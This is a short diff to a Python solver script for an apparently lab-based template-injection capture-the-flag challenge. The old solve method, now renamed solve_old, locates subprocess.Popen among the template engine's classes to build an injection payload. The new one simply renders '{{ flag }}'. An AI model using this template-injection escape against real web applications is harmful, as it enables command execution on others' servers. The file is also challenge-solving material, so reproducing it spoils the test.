@@ -23,7 +23,7 @@ class Solve:
         ).text
         return requests.get(self.base_url + filename).content[4+len(H4X_HEADER):].decode('ascii')
 
-    def solve(self):
+    def solve_old(self):
         self.base_url = os.environ.get('CTFT_TEMPLATE_POLYGLOT_URL')
         if self.base_url[-1] != '/':
             self.base_url += '/'
@@ -33,6 +33,12 @@ class Solve:
         a = s.split(',')
         idx = a.index(" <class 'subprocess.Popen'>")
         return self.get_rendered(H4X_FLAG.replace(b'XIDXX', bytes(str(idx), 'ascii')))
+
+    def solve(self):
+        self.base_url = os.environ.get('CTFT_TEMPLATE_POLYGLOT_URL')
+        if self.base_url[-1] != '/':
+            self.base_url += '/'
+        return self.get_rendered(b"{{ flag }}")
 
 
 def solve():
